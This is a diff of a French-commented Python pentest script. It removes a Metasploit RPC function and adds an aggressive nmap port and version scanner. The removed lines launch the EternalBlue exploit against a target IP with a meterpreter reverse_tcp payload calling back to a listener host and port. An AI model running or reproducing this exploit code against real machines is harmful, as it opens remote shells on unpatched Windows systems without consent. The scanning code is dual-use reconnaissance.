@@ -1,31 +1,33 @@
-from pymetasploit3.msfrpc import MsfRpcClient
-from logger import log_info, log_error
+import nmap
 
-def run_metasploit_scan(target):
-    # Remplacez 'my_password' par le mot de passe de votre choix pour la connexion RPC à Metasploit
-    client = MsfRpcClient('password', server='localhost', port=55553, ssl=False)
+from logger import log_info, log_error, save_result
 
-    # Utilisez un exploit réel, par exemple 'windows/smb/ms17_010_eternalblue'
-    exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
-    exploit['RHOSTS'] = target
+def run_nmap_scan():
 
-    # Configurez le payload (exemple: windows/x64/meterpreter/reverse_tcp)
-    payload = 'windows/x64/meterpreter/reverse_tcp'
-    exploit['LHOST'] = '192.168.1.1'  # Remplacez par votre adresse IP locale réelle
-    exploit['LPORT'] = 4444
+    print("\n________________________________________________________")
+    targets = input("Veuillez entrer l'adresse IP, la plage d'adresses IP ou le CIDR à scanner (exemple : 192.168.1.0/24 ou 192.168.1.1-192.168.1.254) : ")
+    print("\n")    
+    ports = "22,21,23,443,80,53,135,8080,8888" # Ports à scanner
+    options = "-A -O -sV -T4" # Options pour le scan Nmap
+    print("Buvez un café, ça risque de prendre du temps..")
+    print("Démarrage du scan Nmap sur les cibles.")
+    
+    log_info(f"Démarrage du scan Nmap sur les cibles : {targets}, ports : {ports}")
+    scanner = nmap.PortScanner()
 
-    # Exécutez l'exploit
-    log_info(f"Début de l'attaque Metasploit contre {target}")
     try:
-        result = exploit.execute(payload=payload)
-        log_info(f"Résultat de l'attaque Metasploit: {result}")
+        scanner.scan(hosts=targets, ports=ports, arguments=options)
+
+        result_str = f"Résultats du scan Nmap pour les cibles : {targets}, ports : {ports}\n"
+        for host in scanner.all_hosts():
+            result_str += f"{host}:\n"
+            for proto in scanner[host].all_protocols():
+                for port in scanner[host][proto].keys():
+                    port_state = scanner[host][proto][port]['state']
+                    if port_state not in ['closed', 'filtered']:
+                        result_str += f"  {port}: {port_state} {scanner[host][proto][port]['name']} {scanner[host][proto][port]['product']} {scanner[host][proto][port]['version']}\n"
+        save_result(result_str, result_file="results/nmap_results.txt")
+        log_info(f"Scan Nmap terminé pour les cibles : {targets}, ports : {ports}")
+
     except Exception as e:
-        log_error(f"Erreur lors de l'attaque Metasploit contre {target}: {e}")
-
-    # Fermez la connexion RPC
-    client.logout()
-
-# Exemple d'utilisation de la fonction
-if __name__ == '__main__':
-    target = '192.168.1.2'  # Remplacez par l'adresse IP cible réelle
-    run_metasploit_scan(target)
+        log_error(f"Erreur lors de l'exécution du scan Nmap : {e}")
